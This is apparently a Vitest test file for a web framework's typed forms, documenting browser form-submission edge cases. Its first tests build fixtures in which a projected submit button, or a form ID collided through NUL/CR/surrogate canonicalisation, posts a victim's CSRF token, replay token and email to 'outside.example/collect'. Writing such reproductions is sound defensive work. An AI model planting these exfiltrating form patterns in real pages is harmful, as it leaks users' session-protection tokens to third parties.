import { afterEach, expect, it } from 'vitest';

const initialBody = document.body.innerHTML;

afterEach(() => {
  document.body.innerHTML = initialBody;
});

it('shows that a projected descendant submitter can exfiltrate typed-form authority', () => {
  // This is the DOM produced by a component that renders `{children}` inside its typed form. The
  // compiler rereview fixture proves cab9c34a5 accepts the corresponding TSX with zero KV242.
  document.body.innerHTML = `
    <form id="account-save" action="/_m/account/save" method="post" data-mutation="account/save">
      <input type="hidden" name="kovo-csrf" value="victim-csrf-token">
      <input type="hidden" name="Kovo-Idem" value="victim-replay-token">
      <input name="email" value="victim@example.test">
      <button
        id="projected-submit"
        formaction="https://outside.example/collect"
        formmethod="post"
        name="intent"
        value="exfiltrate"
      >Send</button>
    </form>
  `;

  const form = document.querySelector<HTMLFormElement>('#account-save');
  const submitter = document.querySelector<HTMLButtonElement>('#projected-submit');
  if (!form || !submitter) throw new Error('missing projected submitter fixture');

  expect(submitter.form).toBe(form);
  expect(submitter.formAction).toBe('https://outside.example/collect');
  expect(submitter.formMethod).toBe('post');

  const body = new FormData(form, submitter);
  expect(body.get('kovo-csrf')).toBe('victim-csrf-token');
  expect(body.get('Kovo-Idem')).toBe('victim-replay-token');
  expect(body.get('email')).toBe('victim@example.test');
  expect(body.get('intent')).toBe('exfiltrate');
});

it.each([
  ['NUL replacement', 'account\u0000save', 'account\ufffdsave'],
  ['CR preprocessing', 'account\rsave', 'account\nsave'],
  ['CRLF preprocessing', 'account\r\nsave', 'account\nsave'],
  ['lone surrogate UTF-8 replacement', 'account\ud800save', 'account\ufffdsave'],
])('shows that %s can retarget a source-distinct form owner', (_label, authoredId, wireId) => {
  const authoredHtml = `
    <form id="${authoredId}" action="/_m/account/save" method="post" data-mutation="account/save">
      <input type="hidden" name="kovo-csrf" value="victim-csrf-token">
      <input type="hidden" name="Kovo-Idem" value="victim-replay-token">
    </form>
    <form id="${wireId}" action="https://preview.example/form" method="get"></form>
    <button
      id="canonicalized-submit"
      form="${wireId}"
      formaction="https://outside.example/collect"
      formmethod="post"
    >Send</button>
  `;
  // Simulate SSR byte serialization before fragment parsing. TextEncoder replaces lone UTF-16
  // surrogates exactly as the HTTP wire does; the HTML input stream then performs NUL/CR handling.
  document.body.innerHTML = new TextDecoder().decode(new TextEncoder().encode(authoredHtml));

  const forms = document.querySelectorAll<HTMLFormElement>('form');
  const typed = forms.item(0);
  const native = forms.item(1);
  const submitter = document.querySelector<HTMLButtonElement>('#canonicalized-submit');
  if (!typed || !native || !submitter) throw new Error('missing canonicalized-id fixture');

  expect(typed.id).toBe(wireId);
  expect(native.id).toBe(wireId);
  expect(submitter.form).toBe(typed);
  expect(new FormData(submitter.form, submitter).get('kovo-csrf')).toBe('victim-csrf-token');
  expect(submitter.formAction).toBe('https://outside.example/collect');
});

it.each([
  ['NUL replacement', 'record\u0000a', 'record\ufffda'],
  ['CR preprocessing', 'record\ra', 'record\na'],
  ['CRLF preprocessing', 'record\r\na', 'record\na'],
  ['lone surrogate UTF-8 replacement', 'record\ud800a', 'record\ufffda'],
])(
  'reproduces a %s collision across keyed row, fragment, and submitted record identity',
  (_label, authoredId, wireId) => {
    const authoredHtml = `
      <form kovo-key="${authoredId}" kovo-fragment-target="edit:${authoredId}">
        <input type="hidden" name="kovo-form-key" value="${authoredId}">
        <input type="hidden" name="recordId" value="${authoredId}">
      </form>
      <form kovo-key="${wireId}" kovo-fragment-target="edit:${wireId}">
        <input type="hidden" name="kovo-form-key" value="${wireId}">
        <input type="hidden" name="recordId" value="${wireId}">
      </form>
    `;
    document.body.innerHTML = new TextDecoder().decode(new TextEncoder().encode(authoredHtml));

    const forms = document.querySelectorAll<HTMLFormElement>('form');
    const sourceDistinctRecord = forms.item(0);
    const replacementRecord = forms.item(1);
    expect(sourceDistinctRecord.getAttribute('kovo-key')).toBe(wireId);
    expect(replacementRecord.getAttribute('kovo-key')).toBe(wireId);
    expect(sourceDistinctRecord.getAttribute('kovo-fragment-target')).toBe(`edit:${wireId}`);
    expect(replacementRecord.getAttribute('kovo-fragment-target')).toBe(`edit:${wireId}`);

    const submitted = new FormData(sourceDistinctRecord);
    expect(submitted.get('kovo-form-key')).toBe(wireId);
    expect(submitted.get('recordId')).toBe(wireId);
    expect(submitted.get('recordId')).not.toBe(authoredId);
  },
);

it('shows native urlencoded and multipart line-ending collapse after FormData construction', async () => {
  document.body.innerHTML = `
    <iframe name="wire-result"></iframe>
    <form method="get" action="about:blank" target="wire-result">
      <input type="hidden" name="record\nId" value="record\n1">
      <textarea name="notes">first\nsecond</textarea>
    </form>
  `;
  const form = document.querySelector<HTMLFormElement>('form');
  const frame = document.querySelector<HTMLIFrameElement>('iframe');
  if (!form || !frame) throw new Error('missing native form-encoding fixture');

  // FormData exposes LF, but both native urlencoded submission and multipart body serialization
  // rewrite successful-control names/values to CRLF. SPEC §13.2 routing/identity fields therefore
  // cannot use a source line ending. The textarea is the positive contrast: multiline business
  // content intentionally accepts this ordinary native form canonicalization.
  const data = new FormData(form);
  expect([...data.entries()]).toEqual([
    ['record\nId', 'record\n1'],
    ['notes', 'first\nsecond'],
  ]);

  const loaded = new Promise<string>((resolve) => {
    const onLoad = () => {
      const href = frame.contentWindow?.location.href ?? '';
      if (!href.includes('?')) return;
      frame.removeEventListener('load', onLoad);
      resolve(href);
    };
    frame.addEventListener('load', onLoad);
  });
  form.requestSubmit();
  await expect(loaded).resolves.toBe(
    'about:blank?record%0D%0AId=record%0D%0A1&notes=first%0D%0Asecond',
  );

  const multipart = await new Request('https://kovo.invalid/submit', {
    body: data,
    method: 'POST',
  }).text();
  expect(multipart).toContain('name="record%0D%0AId"');
  expect(multipart).toContain('record\r\n1');
  expect(multipart).toContain('first\r\nsecond');
});

it('shows option fallback collapse and explicit-value select identity', () => {
  document.body.innerHTML = `
    <form>
      <select name="fallback">
        <option selected> record\t  one </option>
      </select>
      <select name="explicit">
        <option selected value="record-1"> record\t  one </option>
      </select>
      <select name="unicode">
        <option selected value="record😀1">Record</option>
      </select>
    </form>
  `;
  const form = document.querySelector<HTMLFormElement>('form');
  if (!form) throw new Error('missing select identity fixture');

  const submitted = new FormData(form);
  expect(submitted.get('fallback')).toBe('record one');
  expect(submitted.get('explicit')).toBe('record-1');
  expect(submitted.get('unicode')).toBe('record😀1');
});

it.each([
  ['exact spelling', 'hidden', '_charset_'],
  ['ASCII-mixed spelling', 'HiDdEn', '_ChArSeT_'],
])(
  'shows the reserved _charset_ control overwrites a stable hidden value with %s',
  (_label, type, name) => {
    document.body.innerHTML = `
    <form>
      <input type="${type}" name="${name}" value="record-1">
    </form>
  `;
    const form = document.querySelector<HTMLFormElement>('form');
    const input = document.querySelector<HTMLInputElement>('input');
    if (!form || !input) throw new Error('missing _charset_ fixture');

    // The source/DOM value is stable, but HTML's entry-list construction reserves this exact hidden
    // control name and replaces the submitted value with the selected encoding label.
    expect(input.value).toBe('record-1');
    expect(new FormData(form).get(name)).toBe('UTF-8');
  },
);

it('keeps non-hidden and non-reserved _charset_ neighbors unchanged', () => {
  document.body.innerHTML = `
    <form>
      <input type="text" name="_charset_" value="record-1">
      <input type="hidden" name="charset" value="record-2">
    </form>
  `;
  const form = document.querySelector<HTMLFormElement>('form');
  if (!form) throw new Error('missing _charset_ precision fixture');

  expect([...new FormData(form).entries()]).toEqual([
    ['_charset_', 'record-1'],
    ['charset', 'record-2'],
  ]);
});
